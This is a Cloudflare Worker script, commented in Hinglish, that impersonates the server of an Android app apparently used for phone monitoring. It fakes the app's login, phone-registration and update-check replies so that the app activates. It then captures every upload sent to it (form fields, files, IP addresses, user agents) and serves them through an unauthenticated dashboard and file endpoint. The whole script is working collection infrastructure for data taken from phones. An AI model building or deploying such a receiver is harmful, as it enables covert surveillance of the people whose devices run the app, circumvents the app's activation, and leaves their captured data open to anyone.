// Guardian Panel — API Worker (UI is served from public/index.html via [assets])
// APK ke liye zaroori responses:
//   - Data upload endpoints  -> EXACT text "ok"  (Retrofit String check: body.equals("ok"))
//   - user/loginUser.php     -> {"status":"ok","idClient":1}
//   - user/verifPhone.php    -> {"status":"ok","nbPhone":0}
//   - user/savePhone.php     -> {"status":"ok","idPhone":1}   (isi se app activate hoti hai)
//   - user/getLastVersionApp.php -> {"forceUpdateApp":"false"}
// Har POST capture hoke /api/captures mein dikhta hai.

var captures = [];
var MAX_CAPTURES = 2000;

addEventListener("fetch", function (event) {
  event.respondWith(handle(event.request));
});

function corsHeaders() {
  return {
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type",
  };
}

function jsonResp(obj, status) {
  return new Response(JSON.stringify(obj), {
    status: status || 200,
    headers: Object.assign({ "content-type": "application/json; charset=utf-8" }, corsHeaders()),
  });
}

function handle(request) {
  var url = new URL(request.url);
  var method = request.method;
  var path = url.pathname;

  if (method === "OPTIONS") {
    return new Response(null, { status: 204, headers: corsHeaders() });
  }

  // ---------- Dashboard API ----------
  if (path === "/api/captures" && method === "GET") {
    return jsonResp(captures);
  }
  if (path === "/api/clear" && method === "POST") {
    captures = [];
    return jsonResp({ ok: true, message: "cleared" });
  }
  if (path === "/api/health" && method === "GET") {
    return jsonResp({ ok: true, captures: captures.length, time: new Date().toISOString() });
  }
  if (path.indexOf("/api/file/") === 0 && method === "GET") {
    return serveFile(path.slice("/api/file/".length));
  }

  // ---------- APK capture (any POST) ----------
  if (method === "POST") {
    var p = url.pathname;

    // Capture pehle — response baad mein (capture fail ho to bhi APK ko jawab mile)
    var capPromise = capturePost(request, url);

    return capPromise.then(function () {
      // Activation / config endpoints (JSON)
      if (p === "/user/loginUser.php") {
        return jsonResp({ status: "ok", idClient: 1 });
      }
      if (p === "/user/verifPhone.php") {
        return jsonResp({ status: "ok", nbPhone: 0 });
      }
      if (p === "/user/savePhone.php") {
        return jsonResp({ status: "ok", idPhone: 1 });
      }
      if (p === "/user/getLastVersionApp.php") {
        return jsonResp({ forceUpdateApp: "false", lastVersion: "525" });
      }
      // Baaki SAB endpoints: plain text "ok" — app isi ko success maanta hai
      return new Response("ok", {
        status: 200,
        headers: Object.assign({ "content-type": "text/plain; charset=utf-8" }, corsHeaders()),
      });
    });
  }

  // Unknown GET -> dashboard
  if (method === "GET") {
    return Response.redirect(url.origin + "/", 302);
  }

  return new Response("Not found", { status: 404, headers: corsHeaders() });
}

async function capturePost(request, url) {
  var fields = {};
  var files = [];
  var bodyPreview = "";

  try {
    var ct = request.headers.get("content-type") || "";

    if (ct.indexOf("multipart/form-data") === 0) {
      var form = await request.formData();
      var entries = [];
      form.forEach(function (value, key) {
        entries.push([key, value]);
      });
      for (var i = 0; i < entries.length; i++) {
        var key = entries[i][0];
        var value = entries[i][1];
        var isFile = value && typeof value === "object" && typeof value.arrayBuffer === "function";
        if (isFile) {
          var meta = {
            name: value.name,
            type: value.type || "application/octet-stream",
            size: value.size,
            fileKey: null,
          };
          // KV bound ho aur file 20MB se choti ho to store karo
          if (typeof KV_DATA !== "undefined" && KV_DATA && value.size <= 20971520) {
            try {
              var fkey = Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
              await KV_DATA.put("f:" + fkey, await value.arrayBuffer());
              await KV_DATA.put("m:" + fkey, JSON.stringify(meta));
              meta.fileKey = fkey;
            } catch (e2) {
              // KV fail -> metadata only
            }
          }
          files.push(meta);
          fields[key] = "[file] " + value.name;
        } else {
          fields[key] = String(value);
        }
      }
    } else {
      var text = await request.text();
      bodyPreview = String(text).slice(0, 4000);
      try {
        var params = new URLSearchParams(text);
        params.forEach(function (v, k) {
          fields[k] = v;
        });
      } catch (e3) {
        // not form-urlencoded -> keep raw body only
      }
    }
  } catch (e) {
    bodyPreview = "[parse error] " + String(e);
  }

  var cap = {
    id: Date.now().toString(36) + Math.random().toString(36).slice(2, 8),
    time: new Date().toISOString(),
    path: url.pathname,
    query: Object.fromEntries(url.searchParams),
    fields: fields,
    files: files,
    body: bodyPreview,
    ip: request.headers.get("cf-connecting-ip") || "",
    ua: request.headers.get("user-agent") || "",
  };

  captures.unshift(cap);
  if (captures.length > MAX_CAPTURES) {
    captures.pop();
  }
  return cap;
}

async function serveFile(key) {
  if (typeof KV_DATA === "undefined" || !KV_DATA) {
    return jsonResp({ error: "KV_DATA not connected" }, 404);
  }
  if (!key || key.indexOf(":") >= 0) {
    return jsonResp({ error: "bad key" }, 400);
  }
  try {
    var metaRaw = await KV_DATA.get("m:" + key);
    var data = await KV_DATA.get("f:" + key, "arrayBuffer");
    if (!data) {
      return jsonResp({ error: "not found" }, 404);
    }
    var meta = { type: "application/octet-stream", name: key };
    if (metaRaw) {
      try {
        meta = JSON.parse(metaRaw);
      } catch (e) {
        // keep default meta
      }
    }
    return new Response(data, {
      status: 200,
      headers: Object.assign(
        {
          "content-type": meta.type || "application/octet-stream",
          "content-disposition": 'inline; filename="' + String(meta.name || key) + '"',
          "cache-control": "public, max-age=86400",
        },
        corsHeaders()
      ),
    });
  } catch (e2) {
    return jsonResp({ error: String(e2) }, 500);
  }
}
